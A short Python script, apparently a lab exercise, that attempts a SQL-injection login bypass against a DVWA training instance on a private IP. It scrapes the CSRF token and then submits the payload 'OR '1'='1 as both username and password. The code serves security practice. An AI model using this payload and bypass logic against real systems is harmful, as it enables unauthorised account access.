import requests
import re 

url = "http://192.168.0.187/dvwa/login.php"
payload = {
    "username": "'OR '1'='1",
    "password": "'OR '1'='1",
    "Login": "Login"
}

session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": url
}

res = session.get(url, headers=headers)

match = re.search(r'name=[\'"]user_token[\'"] value=[\'"](.*?)[\'"]', res.text)

if match:
    token = match.group(1)
    payload["user_token"] = token
    print(f"[DEBUG] Token: {token}")
else:
    print("[-] user_token not found!")


response = session.post(url, data=payload, headers=headers)

if "logout" in response.text.lower():
    print("[+] SQL Injection recgnized!")
elif "csrf token is incorrect" in response.text.lower():
    print("[-] session or csrf is incorrect")
else:
    print("[-] Login failed with malicious input.")


print(response.text)  # ← چاپ خروجی کامل صفحه بعد از لاگین


